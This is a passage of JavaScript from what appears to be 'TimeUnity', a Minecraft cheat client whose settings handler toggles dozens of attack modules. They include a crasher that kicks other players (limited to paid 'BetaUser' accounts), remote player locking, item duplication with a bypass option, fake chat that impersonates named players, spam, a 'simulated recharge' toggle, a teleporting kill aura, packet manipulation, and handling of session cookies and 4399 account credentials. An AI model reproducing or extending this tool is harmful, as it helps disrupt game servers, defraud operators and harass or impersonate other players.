                            AnvilDamage_Enabled = eventData[key];
                            addCustomArrayList("AnvilDamage", '铁砧损坏者', '铁砧损坏者', eventData[key]);
                            ModuleTip("AnvilDamage", eventData[key]);
                        }
                        if (key == "AnvilDamage_value") {
                            AnvilDamage_value = Number(eventData[key]);
                        }
                        if (key == "Structure") {
                            Structure_Enabled = eventData[key];
                            addCustomArrayList("Structure", '虚影障幕', '虚影障幕', eventData[key]);
                            ModuleTip("FillStructure", eventData[key]);
                        }
                        if (key == "NotMe") {
                            NotMe = eventData[key];
                        }
                        if (key == "target_self") {
                            target_self = eventData[key];
                        }
                        if (key == "LockPos") {
                            LockPos = eventData[key];
                        }
                        if (key == "JsonMode") {
                            JsonMode = eventData[key];
                        }
                        if (key == "CircleMode") {
                            CircleMode = eventData[key];
                        }
                        if (key == "DelayTime") {
                            DelayTime = Number(eventData[key]);
                        }
                        if (key == "MoveSpeed") {
                            MoveSpeed = Number(eventData[key]);
                        }
                        if (key == "MoveRadius") {
                            MoveRadius = Number(eventData[key]);
                        }
                        if (key == "Xsize") {
                            Xsize = Number(eventData[key]);
                        }
                        if (key == "Ysize") {
                            Ysize = Number(eventData[key]);
                        }
                        if (key == "Zsize") {
                            Zsize = Number(eventData[key]);
                        }
                        if (key == "Xoffset") {
                            Xoffset = Number(eventData[key]);
                        }
                        if (key == "Yoffset") {
                            Yoffset = Number(eventData[key]);
                        }
                        if (key == "Zoffset") {
                            Zoffset = Number(eventData[key]);
                        }
                        if (key == "AntiHit") {
                            AntiHit_Enabled = eventData[key];
                            addCustomArrayList("AntiHit", '受击卡空', '受击卡空', eventData[key]);
                            ModuleTip("AntiHit", eventData[key]);
                        }
                        if (eventData["CoordHUD"] == true) {
                            CoordHUD_Enabled = true;
                            addCustomArrayList("CoordHUD", '显示坐标', '显示坐标', true);
                            ModuleTip("CoordHUD", CoordHUD_Enabled);
                        }
                        if (eventData["CoordHUD"] == false) {
                            CoordHUD_Enabled = false;
                            updateTextContent(TextPos, "");
                            addCustomArrayList("CoordHUD", '显示坐标', '显示坐标', false);
                            ModuleTip("CoordHUD", CoordHUD_Enabled);
                        }
                        if (key == "TextPosX") {
                            TextPosX = Number(eventData[key]);
                        }
                        if (key == "TextPosY") {
                            TextPosY = Number(eventData[key]);
                        }
                        if (key == "AntiInvis") {
                            AntiInvis_Enabled = eventData[key];
                            addCustomArrayList("AntiInvis", '反隐身', '反隐身', eventData[key]);
                            ModuleTip("AntiInvis", eventData[key]);
                        }
                        if (key == "CampersAura") {
                            CampersAura_Enabled = eventData[key];
                            addCustomArrayList("CampersAura", '卡人光环', '卡人光环', eventData[key]);
                            ModuleTip("CampersAura", eventData[key]);
                            _v8.gc();
                        }
                        if (key == "CampersAura_Speed") {
                            CampersAura_Speed = Number(eventData[key]);
                        }
                        if (key == "Crasher") {
                            if (BetaUser) {
                                if (SyncSkinData === null) {
                                    _https.get("http://time.fuhongweb.cn/getBetaData.php", {}, function(code, response) {
                                        if (response && SyncSkinData === null) {
                                            SyncSkinData = response;
                                        }
                                    });
                                }
                                Crasher_Enabled = eventData[key];
                                Crasher_Count = Crasher_Delay * 10;
                                addCustomArrayList("Crasher", '踢人光环', '踢人光环', eventData[key]);
                                ModuleTip("Crasher", eventData[key]);
                            } else if (eventData[key]) {
                                _app.showToast("权限不足，该功能仅定制用户可用");
                                return;
                            }
                        }
                        if (key == "Crasher_Delay") {
                            Crasher_Delay = Number(eventData[key]);
                        }
                        if (key == "CustomName") {
                            CustomName_Enabled = eventData[key];
                            addCustomArrayList("CustomName", '自定义名称', '自定义名称', eventData[key]);
                            ModuleTip("CustomName", eventData[key]);
                        }
                        if (key == "CustomName_Content") {
                            CustomName_Content = eventData[key];
                        }
                        if (key == "LobbyLockPlayer") {
                            if (BetaUser) {
                                LobbyLockPlayer_Enabled = eventData[key];
                                _fs.write(_app.getResource() + "/TimeUnity/LockUID.json", JSON.stringify({
                                    Enable: Boolean(eventData[key]),
                                    UID: LobbyLockPlayer_UID
                                }, null, 2));
                                addCustomArrayList("LobbyLockPlayer", '远程卡人', '远程卡人', eventData[key]);
                                ModuleTip("LobbyLockPlayer", eventData[key]);
                            } else if (eventData[key]) {
                                _app.showToast("权限不足，该功能仅定制用户可用");
                                return;
                            }
                        }
                        if (key == "LobbyLockPlayer_UID") {
                            if (eventData[key]) {
                                LobbyLockPlayer_UID = eventData[key];
                                _fs.write(_app.getResource() + "/TimeUnity/LockUID.json", JSON.stringify({
                                    Enable: LobbyLockPlayer_Enabled,
                                    UID: LobbyLockPlayer_UID
                                }, null, 2));
                            }
                        }
                        if (key == "Replication") {
                            Replication_Enabled = eventData[key];
                            addCustomArrayList("Replication", '复制物品', '复制物品', eventData[key]);
                            ModuleTip("Replication", eventData[key]);
                        }
                        if (eventData["Replication"] == false && Replication_Drop) {
                            _minecraft.sendChatMessage("[TimeUnity]清除宠物背包物品");
                        }
                        if (key == "Replication_Drop") {
                            Replication_Drop = eventData[key];
                        }
                        if (key == "Replication_Bypas") {
                            Replication_Bypas = eventData[key];
                        }
                        if (key == "Replication_Delay") {
                            Replication_Delay = Number(eventData[key]);
                        }
                        if (key == "Replication_Count") {
                            Replication_Count = Number(eventData[key]);
                        }
                        if (key == "NoReceivePacket") {
                            NoReceivePacket = eventData[key];
                            addCustomArrayList("NoReceivePacket", '停止收包', '停止收包', eventData[key]);
                            ModuleTip("NoReceivePacket", eventData[key]);
                        }
                        if (key == "PyRpcTube") {
                            PyRpcTube = eventData[key];
                            addCustomArrayList("PyRpcTube", 'PyRpc管理', 'PyRpc管理', eventData[key]);
                            ModuleTip("PyRpcTube", eventData[key]);
                        }
                        if (key == "PyRpcTube_Send") {
                            PyRpcTube_Send = eventData[key];
                        }
                        if (key == "PyRpcTube_Receive") {
                            PyRpcTube_Receive = eventData[key];
                        }
                        if (key == "PyRpcTube_Save") {
                            PyRpcTube_Save = eventData[key];
                        }
                        if (key == "PyRpcTube_Tip") {
                            PyRpcTube_Tip = eventData[key];
                        }
                        if (key == "PyRpcTube_Cycle") {
                            PyRpcTube_Cycle = eventData[key];
                        }
                        if (key == "PyRpcTube_Delay") {
                            PyRpcTube_Delay = Number(eventData[key]);
                        }
                        if (eventData.key === "PyRpcTube_Custom") {
                            PyRpcTube_Custom();
                        }
                        if (key == "Camera") {
                            if (eventData[key]) {
                                _options.setPlayerViewPerspective(1);
                                _camera.departCamera();
                            } else _camera.resetCamera();
                            addCustomArrayList("Camera", '自由视角', '自由视角', eventData[key]);
                            ModuleTip("FreeCamera", eventData[key]);
                        }
                        if (key == "SuicideAura") {
                            SuicideAura_Enabled = eventData[key];
                            addCustomArrayList("SuicideAura", '自杀光环', '自杀光环', eventData[key]);
                            ModuleTip("SuicideAura", eventData[key]);
                        }
                        if (key == "Simulated") {
                            _fs.write(_app.getResource() + "/TimeUnity/Simulated.json", JSON.stringify({
                                Enable: Boolean(eventData[key])
                            }, null, 2));
                            addCustomArrayList("Simulated", '模拟充值', '模拟充值', eventData[key]);
                            ModuleTip("Simulated", eventData[key]);
                        }
                        if (key == "DropCarriedItem") {
                            DropCarriedItem_Enabled = eventData[key];
                            addCustomArrayList("DropCarriedItem", '丢弃物品', '丢弃物品', eventData[key]);
                            ModuleTip("DropCarriedItem", eventData[key]);
                        }
                        if (key == "BJD_Deputy") {
                            BJD_Deputy_Enabled = eventData[key];
                            addCustomArrayList("BJD_Deputy", '布吉岛副手', '布吉岛副手', eventData[key]);
                            ModuleTip("BJD_Deputy", eventData[key]);
                        }
                        if (eventData["Timer"] == true) {
                            Timer_Enabled = true;
                            addCustomArrayList("Timer", '变速', '变速', true);
                            ModuleTip("Timer", Timer_Enabled);
                        }
                        if (eventData["Timer"] == false) {
                            Timer_Enabled = false;
                            callModule(30, '{"value":false,"speed":20}');
                            addCustomArrayList("Timer", '变速', '变速', false);
                            ModuleTip("Timer", Timer_Enabled);
                        }
                        if (key == "Timer_speed") {
                            Timer_speed = Number(eventData[key]);
                        }
                        if (key == "SetHand") {
                            SetHand_Enabled = eventData[key];
                            addCustomArrayList("SetHand", '修改挥手', '修改挥手', eventData[key]);
                            ModuleTip("SetHand", eventData[key]);
                        }
                        if (key == "DamageHUD") {
                            DamageHUD_Enabled = eventData[key];
                            addCustomArrayList("DamageHUD", '受伤显示', '受伤显示', eventData[key]);
                            ModuleTip("DamageHUD", eventData[key]);
                        }
                        if (key == "AutoTeam") {
                            AutoTeam = eventData[key];
                            addCustomArrayList("AutoTeam", '智能队友', '智能队友', eventData[key]);
                            ModuleTip("AutoTeam", eventData[key]);
                        }
                        if (key == "check_armor") {
                            check_armor = eventData[key];
                        }
                        if (key == "check_skin") {
                            check_skin = eventData[key];
                        }
                        if (key == "Hand_Speed") {
                            Hand_Speed = Number(eventData[key]);
                        }
                        if (key == "ColorChat") {
                            ColorChat_Enabled = eventData[key];
                            addCustomArrayList("ColorChat", '彩色发言', '彩色发言', eventData[key]);
                            ModuleTip("ColorChat", eventData[key]);
                        }
                        if (key == "PacketDestroy") {
                            PacketDestroy_Enabled = eventData[key];
                            addCustomArrayList("PacketDestroy", '发包挖掘', '发包挖掘', eventData[key]);
                            ModuleTip("PacketDestroy", eventData[key]);
                        }
                        if (key == "PacketDestroy_Number") {
                            PacketDestroy_Number = Number(eventData[key]);
                        }
                        if (key == "AIChat") {
                            AIChat_Enabled = eventData[key];
                            addCustomArrayList("AIChat", 'AI聊天', 'AI聊天', eventData[key]);
                            ModuleTip("AIChat", eventData[key]);
                        }
                        if (eventData["AIChat_Option"] == "AIChat_Single") {
                            AIChat_Single = true;
                            AIChat_Whole = false;
                        }
                        if (eventData["AIChat_Option"] == "AIChat_Whole") {
                            AIChat_Whole = true;
                            AIChat_Single = false;
                        }
                        if (eventData.key == "AIChat_Record") {
                            if (_fs.exists(ChatRecord)) {
                                _minecraft.clientMessage('§6=== 聊天记录 ===\n§7' + _fs.read(ChatRecord));
                            } else {
                                _minecraft.clientMessage('§c暂无聊天记录');
                            }
                        }
                        if (eventData.key == "AIChat_ClearRecord") {
                            if (_fs.exists(ChatRecord)) {
                                _fs.remove(ChatRecord);
                                _minecraft.clientMessage('§a已清除聊天记录');
                            } else {
                                _minecraft.clientMessage('§c暂无聊天记录');
                            }
                        }
                        if (key == "AIChat_Display") {
                            AIChat_Button = eventData[key];
                        }
                        if (key == "ShowChunk") {
                            _options.setBoolean(328, {
                                value: eventData[key],
                                defaultValue: false
                            });
                            addCustomArrayList("ShowChunk", '显示区块', '显示区块', eventData[key]);
                            ModuleTip("ShowChunk", eventData[key]);
                        }
                        if (key == "NoParticle") {
                            _options.setBoolean(332, {
                                value: eventData[key],
                                defaultValue: false
                            });
                            addCustomArrayList("NoParticle", '屏蔽粒子', '屏蔽粒子', eventData[key]);
                            ModuleTip("NoParticle", eventData[key]);
                        }
                        if (key == "KillSound") {
                            KillSound = eventData[key];
                            addCustomArrayList("KillSound", 'HYT击杀提示', 'HYT击杀提示', eventData[key]);
                            ModuleTip("KillSound", eventData[key]);
                        }
                        if (key == "DestroyBlockRender") {
                            DestroyBlockRender_Enabled = eventData[key];
                            addCustomArrayList("DestroyBlockRender", '挖掘渲染', '挖掘渲染', eventData[key]);
                            ModuleTip("DestroyBlockRender", eventData[key]);
                        }
                        if (key == "NoShake") {
                            NoShake_Enabled = eventData[key];
                            addCustomArrayList("NoShake", '受击无抖动', '受击无抖动', eventData[key]);
                            ModuleTip("NoShake", eventData[key]);
                        }
                        if (key == "AntiGhost") {
                            AntiGhost_Enabled = eventData[key];
                            addCustomArrayList("AntiGhost", '屏蔽虚影', '屏蔽虚影', eventData[key]);
                            ModuleTip("AntiGhost", eventData[key]);
                        }
                        if (key == "AntiLoot") {
                            AntiLoot_Enabled = eventData[key];
                            addCustomArrayList("AntiLoot", '移除掉落物', '移除掉落物', eventData[key]);
                            ModuleTip("AntiLoot", eventData[key]);
                        }
                        if (key == "AntiFox") {
                            AntiFox_Enabled = eventData[key];
                            addCustomArrayList("AntiFox", '反狐狸', '反狐狸', eventData[key]);
                            ModuleTip("AntiFox", eventData[key]);
                        }
                        if (key == "NoGrave") {
                            NoGrave_Enabled = eventData[key];
                            addCustomArrayList("NoGrave", '原地复活', '原地复活', eventData[key]);
                            ModuleTip("NoGrave", eventData[key]);
                        }
                        if (key == "GhostMode") {
                            if (BetaUser) {
                                GhostMode_Enabled = eventData[key];
                                addCustomArrayList("GhostMode", '幽灵模式', '幽灵模式', eventData[key]);
                                ModuleTip("GhostMode", eventData[key]);
                            } else if (eventData[key]) {
                                _app.showToast("权限不足，该功能仅定制用户可用");
                                return;
                            }
                        }
                        if (key == "AutoGapple") {
                            AutoGapple_Enabled = eventData[key];
                            addCustomArrayList("AutoGapple", '自动金苹果', '自动金苹果', eventData[key]);
                            ModuleTip("AutoGapple", eventData[key]);
                        }
                        if (key == "AutoGapple_Health") {
                            AutoGapple_Health = Number(eventData[key]);
                        }
                        if (key == "AutoFood") {
                            AutoFood_Enabled = eventData[key];
                            addCustomArrayList("AutoFood", '自动蘑菇煲', '自动蘑菇煲', eventData[key]);
                            ModuleTip("AutoFood", eventData[key]);
                        }
                        if (key == "AutoFood_Health") {
                            AutoFood_Health = Number(eventData[key]);
                        }
                        if (key == "AutoDrop") {
                            AutoDrop_Enabled = eventData[key];
                            addCustomArrayList("AutoDrop", '自动丢物', '自动丢物', eventData[key]);
                            ModuleTip("AutoDrop", eventData[key]);
                        }
                        if (eventData["AutoSprint"] == true) {
                            AutoSprint_Enabled = true;
                            addCustomArrayList("AutoSprint", '自动疾跑', '自动疾跑', true);
                            ModuleTip("AutoSprint", AutoSprint_Enabled);
                        }
                        if (eventData["AutoSprint"] == false) {
                            AutoSprint_Enabled = false;
                            _input.buttonUp("button.sprint");
                            addCustomArrayList("AutoSprint", '自动疾跑', '自动疾跑', false);
                            ModuleTip("AutoSprint", AutoSprint_Enabled);
                        }
                        if (key == "AttackParticle") {
                            AttackParticle = eventData[key];
                            addCustomArrayList("AttackParticle", '攻击粒子', '攻击粒子', eventData[key]);
                            ModuleTip("AttackParticle", eventData[key]);
                        }
                        if (key == "AttackParticle_Num") {
                            AttackParticle_Num = Number(eventData[key]);
                        }
                        if (key == "AttackParticle_ID") {
                            AttackParticle_ID = Number(eventData[key]);
                        }
                        if (key == "NoFall") {
                            NoFall_Enabled = eventData[key];
                            ModuleTip("NoFall", eventData[key]);
                            addCustomArrayList("NoFall", '无摔落伤害', '无摔落伤害', eventData[key]);
                        }
                        if (key == "NoFall_BJDMode") {
                            NoFall_BJDMode = eventData[key];
                        }
                        if (key == "CallPlayer_positioning") {
                            if (eventData[key] != null && eventData[key] != true) YD();
                        }
                        if (key == "ViolentFlight_Y") {
                            Y0 = eventData[key];
                        }
                        if (key == "Global_InfiniteAura") {
                            Global_InfiniteAura_MenuOpen = eventData[key];
                            addCustomArrayList("Global_InfiniteAura", '全局百米', '全局百米', eventData[key]);
                            Global_InfiniteAura_PlayerTP = false;
                            Global_InfiniteAura_TargetIds = [];
                        }
                        if (Global_InfiniteAura_MenuOpen && Global_InfiniteAura_IsMenuInitialized && _app.isInGame()) {
                            Global_InfiniteAura_List = getWorldPlayerList();
                            Render_Global_InfiniteAura_Menu();
                            Global_InfiniteAura_IsMenuInitialized = false;
                        }
                        if (!Global_InfiniteAura_MenuOpen && !Global_InfiniteAura_IsMenuInitialized) {
                            Global_InfiniteAura_IsMenuInitialized = true;
                            CloseTransferMenu("Global_InfiniteAura_Menu");
                            Global_InfiniteAura_PlayerList = [];
                        }
                        if (eventData[key] == "Refresh_Global_InfiniteAura_List") {
                            Global_InfiniteAura_List = getWorldPlayerList();
                            Render_Global_InfiniteAura_Menu();
                            Global_InfiniteAura_PlayerTP = false;
                            Global_InfiniteAura_TargetIds = [];
                        }
                        if (key.startsWith("Global_InfiniteAura_Player")) {
                            if (Global_InfiniteAura_MenuOpen && _app.isInGame()) {
                                Global_InfiniteAura_PlayerTP = false;
                                let list = Global_InfiniteAura_List || getWorldPlayerList();
                                let index = parseInt(key.substring("Global_InfiniteAura_Player".length));
                                if (!isNaN(index) && list[index]) {
                                    let targetId = list[index].id;
                                    if (eventData[key]) {
                                        if (Global_InfiniteAura_TargetIds.indexOf(targetId) === -1) {
                                            Global_InfiniteAura_TargetIds.push(targetId);
                                        }
                                    } else {
                                        let idIndex = Global_InfiniteAura_TargetIds.indexOf(targetId);
                                        if (idIndex !== -1) {
                                            Global_InfiniteAura_TargetIds.splice(idIndex, 1);
                                        }
                                    }
                                }
                            }
                        }
                        if (key == "Global_InfiniteAura_Delay") {
                            Global_InfiniteAura_Delay = Number(eventData[key]);
                        }
                        if (key == "Global_InfiniteAura_TeleCount") {
                            Global_InfiniteAura_TeleCount = Number(eventData[key]);
                        }
                        if (key == "Global_InfiniteAura_AttackCount") {
                            Global_InfiniteAura_AttackCount = Number(eventData[key]);
                        }
                        if (key == "ParticleBoom") {
                            ParticleBoom_MenuOpen = eventData[key];
                            addCustomArrayList("ParticleBoom", '粒子爆炸', '粒子爆炸', eventData[key]);
                            ParticleBoom_TargetIds = [];
                        }
                        if (ParticleBoom_MenuOpen && ParticleBoom_IsMenuInitialized && _app.isInGame()) {
                            ParticleBoom_List = PlayerMap;
                            Render_ParticleBoom_Menu();
                            ParticleBoom_IsMenuInitialized = false;
                        }
                        if (!ParticleBoom_MenuOpen && !ParticleBoom_IsMenuInitialized) {
                            ParticleBoom_IsMenuInitialized = true;
                            CloseTransferMenu("ParticleBoom_Menu");
                            ParticleBoom_PlayerList = [];
                        }
                        if (eventData[key] == "Refresh_ParticleBoom_List") {
                            ParticleBoom_List = PlayerMap;
                            Render_ParticleBoom_Menu();
                            ParticleBoom_TargetIds = [];
                        }
                        if (key.startsWith("ParticleBoom_Player")) {
                            if (ParticleBoom_MenuOpen && _app.isInGame()) {
                                let list = ParticleBoom_List || PlayerMap;
                                let index = parseInt(key.substring("ParticleBoom_Player".length));
                                if (!isNaN(index) && list[index]) {
                                    let targetId = list[index].id;
                                    if (eventData[key]) {
                                        if (ParticleBoom_TargetIds.indexOf(targetId) === -1) {
                                            ParticleBoom_TargetIds.push(targetId);
                                        }
                                    } else {
                                        let idIndex = ParticleBoom_TargetIds.indexOf(targetId);
                                        if (idIndex !== -1) {
                                            ParticleBoom_TargetIds.splice(idIndex, 1);
                                        }
                                    }
                                }
                            }
                        }
                        if (key == "ParticleBoom_Quantity") {
                            ParticleBoom_Quantity = Number(eventData[key]);
                        }
                        if (key == "ParticleBoom_ShowParticle") {
                            ParticleBoom_ShowParticle = eventData[key];
                        }
                        if (key == "TransferPlayers") {
                            TransferMenuOpen = eventData[key];
                            addCustomArrayList("TransferPlayers", '玩家定位', '玩家定位', eventData[key]);
                            TransferPlayer_Enabled = false;
                            TransferPlayer_id = null;
                        }
                        if (TransferMenuOpen && IsMenuInitialized && _app.isInGame()) {
                            CachedPlayerList = getWorldPlayerList();
                            RenderTransferMenu();
                            IsMenuInitialized = false;
                        }
                        if (!TransferMenuOpen && !IsMenuInitialized) {
                            IsMenuInitialized = true;
                            CloseTransferMenu("ChtransferMenu");
                            CyclePlayerList = [];
                        }
                        if (key == "TransferPlayersSwitch") EnableTeleport = eventData[key];
                        if (key == "TransferTips") EnableTeleportTip = eventData[key];
                        if (key == "CycleTP") TransferPlayer_CycleTP = eventData[key];
                        if (key == "OutputPosSwitch") EnableCoordinatesMsg = eventData[key];
                        if (key == "SavePosSwitch") EnableLogToFile = eventData[key];
                        if (key == "TransferOffsetSwitch") EnableOffset = eventData[key];
                        if (key == "XTransferOffset") OffsetX = eventData[key];
                        if (key == "YTransferOffset") OffsetY = eventData[key];
                        if (key == "ZTransferOffset") OffsetZ = eventData[key];
                        if (eventData[key] == "RefreshTransferList") {
                            CachedPlayerList = getWorldPlayerList();
                            RenderTransferMenu();
                            TransferPlayer_Enabled = false;
                            TransferPlayer_id = null;
                        }
                        if (key.startsWith("TransferPlayer")) {
                            if (TransferMenuOpen && _app.isInGame()) {
                                TransferPlayer_Enabled = false;
                                TransferPlayer_id = null;
                                let list = CachedPlayerList;
                                for (let i = 0; i < list.length; i++) {
                                    if (eventData["TransferPlayer" + i] === true) {
                                        if (TransferPlayer_CycleTP) {
                                            TransferPlayer_Enabled = true;
                                            TransferPlayer_id = list[i]?.id || null;
                                        } else {
                                            if (list[i]) _minecraft.sendChatMessage("TransferPlayers_" + list[i].id);
                                        }
                                        break;
                                    }
                                }
                            }
                        }
                        if (eventData.fun === "fun_ride_flying" || key === "Speed" || key === "JumpHeight" || eventData.angle || eventData.operation || eventData.Hop !== undefined) {
                            if (eventData.value !== undefined) BunnyHop = eventData.value;
                            if (eventData.Hop !== undefined) Hop = eventData.Hop;
                            if (eventData.Speed !== undefined) Speed = Number(eventData.Speed);
                            if (eventData.JumpHeight !== undefined) JumpHeight = Number(eventData.JumpHeight);
                            if (eventData.fun === "fun_ride_flying") {
                                BunnyHop = true;
                            }
                            if (eventData.angle) angle = eventData.angle;
                            if (eventData.operation) operation = eventData.operation;
                        }
                        if (key == "TeleMine") {
                            TeleMine_Enabled = eventData[key];
                            addCustomArrayList("TeleMine", '传送挖矿', '传送挖矿', eventData[key]);
                            ModuleTip("TeleMine", eventData[key]);
                        }
                        if (MineralSwitches.has(key)) {
                            const value = Boolean(eventData[key]);
                            MineralSwitches.set(key, value);
                            if (LinkedMinerals[key]) {
                                MineralSwitches.set(LinkedMinerals[key], value);
                            }
                        }
                        if (key == "TeleMine_Speed") {
                            TeleMine_Speed = Number(eventData[key]);
                        }
                        if (key == "TeleMine_Range") {
                            TeleMine_Range = Number(eventData[key]);
                        }
                        if (key == "Killnsult") {
                            Killnsult_Enabled = eventData[key];
                            addCustomArrayList("Killnsult", '击杀嘲讽', '击杀嘲讽', eventData[key]);
                            ModuleTip("Killnsult", eventData[key]);
                        }
                        if (key == "Killnsult_BJDMode") {
                            Killnsult_BJDMode = eventData[key];
                        }
                        if (eventData["Blink"] == true) {
                            Blink_Enabled = true;
                            addCustomArrayList("Blink", '瞬移', '瞬移', true);
                            ModuleTip("Blink", true);
                        }
                        if (eventData["Blink"] == false) {
                            Blink_Enabled = false;
                            _minecraft.sendChatMessage("[TimeUnity]BlinkStopEnabled");
                            callModule(30, '{"value":false,"speed":20}');
                            addCustomArrayList("Blink", '瞬移', '瞬移', false);
                            ModuleTip("Blink", false);
                        }
                        if (key == "Blink_Speed") {
                            Blink_Speed = eventData[key];
                        }
                        if (eventData["BJDFly"] == true) {
                            if (getEntityIsGround(self_id) && _app.isInGame()) playerJump();
                            setTimeout(() => {
                                BJDFly_Enabled = true;
                            }, 100);
                            addCustomArrayList("BJDFly", '布吉岛飞行', '布吉岛飞行', true);
                            ModuleTip("BJDFly", eventData[key]);
                        }
                        if (eventData["BJDFly"] == false) {
                            if (_app.isInGame()) {
                                setEntityMotion(self_id, 0, 0, 0);
                                setEntityFlag(self_id, 34, false);
                            }
                            setTimeout(() => {
                                BJDFly_Enabled = false;
                                _minecraft.sendChatMessage("[TimeUnity]BJDFlyStopEnabled");
                            }, 100);
                            addCustomArrayList("BJDFly", '布吉岛飞行', '布吉岛飞行', false);
                            ModuleTip("BJDFly", eventData[key]);
                        }
                        if (key == "BJDFly_Speed") {
                            BJDFly_Speed = Number(eventData[key]);
                        }
                        if (key == "BJDFly_Packet") {
                            BJDFly_Packet = Number(eventData[key]);
                        }
                        if (key == "AutoRetaliate") {
                            AutoRetaliate_Enabled = eventData[key];
                            addCustomArrayList("AutoRetaliate", '被打还击', '被打还击', eventData[key]);
                            ModuleTip("AutoRetaliate", eventData[key]);
                        }
                        if (eventData["AutoRetaliate_choice"] == "AutoRetaliate_Entity") {
                            AutoRetaliate_Entity = true;
                            AutoRetaliate_Player = false;
                        }
                        if (eventData["AutoRetaliate_choice"] == "AutoRetaliate_Player") {
                            AutoRetaliate_Player = true;
                            AutoRetaliate_Entity = false;
                        }
                        if (key == "AttackSound") {
                            AttackSound = eventData[key];
                            addCustomArrayList("AttackSound", '攻击音效', '攻击音效', eventData[key]);
                            ModuleTip("AttackSound", eventData[key]);
                        }
                        if (key == "Spammer") {
                            Spammer_Enabled = eventData[key];
                            addCustomArrayList("Spammer", '自动发言', '自动发言', eventData[key]);
                            ModuleTip("Spammer", eventData[key]);
                        }
                        if (key == "Spammer_Delay") {
                            Spammer_Delay = Number(eventData[key]);
                        }
                        if (key == "Spammer_UseColor") {
                            Spammer_UseColor = eventData[key];
                        }
                        if (key == "Spammer_PetName") {
                            Spammer_PetName = eventData[key];
                        }
                        if (key == "TermBase") {
                            TermBase = eventData[key];
                        }
                        if (key == "Spammer_Text") {
                            Spammer_Text = eventData[key];
                        }
                        if (key == "LowTP") {
                            LowTP_Enabled = eventData[key];
                            addCustomArrayList("LowTP", '残血传送', '残血传送', eventData[key]);
                            ModuleTip("LowTP", eventData[key]);
                        }
                        if (key == "BloodWarp") {
                            BloodWarp = Number(eventData[key]);
                        }
                        if (key == "BloodTP_Pos") {
                            BloodTP_Pos = eventData[key];
                        }
                        if (key == "BringTP") {
                            BringTP_Enabled = eventData[key];
                            addCustomArrayList("BringTP", '带人传送', '带人传送', eventData[key]);
                            ModuleTip("BringTP", eventData[key]);
                        }
                        if (eventData["BringTP"] == true) {
                            BringTP([self_pos.x, self_pos.y, self_pos.z], BringTP_Pos, 70);
                        }
                        if (key == "BringTP_Pos") {
                            BringTP_Pos = eventData[key].split(" ").map(Number);
                        }
                        if (key == "BringTP_Delay") {
                            BringTP_Delay = Number(eventData[key]);
                        }
                        if (key == "AutoLoot") {
                            AutoLoot_Enabled = eventData[key];
                            addCustomArrayList("AutoLoot", '自动拾取', '自动拾取', eventData[key]);
                            ModuleTip("AutoLoot", eventData[key]);
                        }
                        if (key == "AutoLoot_item") {
                            AutoLoot_item = eventData[key];
                        }
                        if (key == "AutoLoot_xp_orb") {
                            AutoLoot_xp_orb = eventData[key];
                        }
                        if (key == "FakeChat") {
                            FakeChat_Enabled = eventData[key];
                            addCustomArrayList("FakeChat", '伪造发言', '伪造发言', eventData[key]);
                            ModuleTip("FakeChat", eventData[key]);
                        }
                        if (key == "FakeChat_Delay") {
                            FakeChat_Delay = Number(eventData[key]);
                        }
                        if (key == "FakeChat_Name") {
                            FakeChat_Name = eventData[key];
                        }
                        if (key == "FakeChat_Text") {
                            FakeChat_Text = eventData[key];
                        }
                        if (key == "FogRender") {
                            FogRender_Enabled = eventData[key];
                            if (!FogRender_Enabled && _app.isInGame()) {
                                _app.evalPython(`
import mod.client.extraClientApi as clientApi
fogComp = clientApi.GetEngineCompFactory().CreateFog("${self_id}")
fogComp.ResetFogColor()
fogComp.ResetFogLength()
`);
                            }
                            addCustomArrayList("FogRender", '迷雾渲染', '迷雾渲染', eventData[key]);
                            ModuleTip("FogRender", eventData[key]);
                        }
                        if (key == "FogRender_Speed") {
                            FogColorConfig.Speed = Number(eventData[key]);
                        }
                        if (key == "FogRender_Range") {
                            FogColorConfig.FogRange = Number(eventData[key]);
                        }
                        if (key == "FogColor_1") {
                            const RGBA = ColorToRGBA(eventData[key]);
                            FogColorConfig.Color1 = {
                                r: Math.round(RGBA[0] * 255),
                                g: Math.round(RGBA[1] * 255),
                                b: Math.round(RGBA[2] * 255)
                            };
                        }
                        if (key == "FogColor_2") {
                            const RGBA = ColorToRGBA(eventData[key]);
                            FogColorConfig.Color2 = {
                                r: Math.round(RGBA[0] * 255),
                                g: Math.round(RGBA[1] * 255),
                                b: Math.round(RGBA[2] * 255)
                            };
                        }
                        if (key == "MoveJump") {
                            MoveJump = eventData[key];
                            if (!MoveJump) _input.buttonUp("button.jump");
                            addCustomArrayList("MoveJump", '移动跳跃', '移动跳跃', eventData[key]);
                            ModuleTip("MoveJump", eventData[key]);
                        }
                        if (key == "JumpSpeed") {
                            JumpSpeed_Enabled = eventData[key];
                            addCustomArrayList("JumpSpeed", '兔子跳', '兔子跳', eventData[key]);
                            ModuleTip("JumpSpeed", eventData[key]);
                        }
                        if (key == "JumpSpeed_Speed") {
                            JumpSpeed_Speed = Number(eventData[key]);
                        }
                        if (key == "JumpSpeed_Height") {
                            JumpSpeed_Height = Number(eventData[key]);
                        }
                        if (key == "BJDSpeed") {
                            BJDSpeed_Enabled = eventData[key];
                            if (!eventData[key]) callModule(30, '{"value":false,"speed":20}');
                            addCustomArrayList("BJDSpeed", '宝马加速', '宝马加速', eventData[key]);
                            ModuleTip("BJDSpeed", eventData[key]);
                        }
                        if (key == "BJDSpeed_Speed") {
                            BJDSpeed_Speed = Number(eventData[key]);
                        }
                        if (key == "BJDSpeed_Timer") {
                            BJDSpeed_Timer = Number(eventData[key]);
                        }
                        if (key == "CookieLogin") {
                            CookieLogin = eventData[key];
                            addCustomArrayList("曲奇登录", '曲奇登录', '曲奇登录', eventData[key]);
                            ModuleTip("CookieLogin", eventData[key]);
                        }
                        if (key == "Cookie_Text") {
                            CookieLogin_Cookie = eventData[key];
                        }
                        if (key == "Sauth_4399Login") {
                            Sauth_4399Login = eventData[key];
                            addCustomArrayList("4399登录", '4399登录', '4399登录', eventData[key]);
                            ModuleTip("4399_Login", eventData[key]);
                            if (Sauth_4399_User !== null && Sauth_4399_Pass !== null && eventData[key] === true) {
                                Login4399Account(Sauth_4399_User, Sauth_4399_Pass);
                            }
                        }
                        if (key == "Sauth_4399_User") {
                            Sauth_4399_User = eventData[key];
                        }
                        if (key == "Sauth_4399_Pass") {
                            Sauth_4399_Pass = eventData[key];
                        }
                        if (key == "SaveCookie") {
                            SaveCookie_Enabled = eventData[key];
                            addCustomArrayList("SaveCookie", 'SaveCookie', 'SaveCookie', eventData[key]);
                            ModuleTip("SaveCookie", eventData[key]);
                        }
                        if (key == "ModuleTip") {
                            ModuleTip_Enabled = eventData[key];
